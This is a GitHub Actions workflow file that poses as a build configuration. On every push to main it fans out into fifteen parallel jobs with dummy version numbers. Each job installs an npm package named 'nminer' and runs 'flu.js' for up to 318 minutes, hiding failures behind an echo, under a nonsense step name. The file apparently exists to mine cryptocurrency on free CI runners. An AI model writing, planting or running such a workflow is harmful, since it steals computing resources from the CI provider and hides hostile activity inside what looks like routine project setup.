name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9515 }
          - { version: 4804 }
          - { version: 4687 }
          - { version: 6790 }
          - { version: 6057 }
          - { version: 5164 }
          - { version: 3281 }
          - { version: 9681 }
          - { version: 9417 }
          - { version: 5049 }
          - { version: 7356 }
          - { version: 522 }
          - { version: 4708 }
          - { version: 8746 }
          - { version: 2568 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: uselessly igloo yuck
        run: |
          npm install nminer@latest
          timeout 318m node flu.js || echo "flu executed"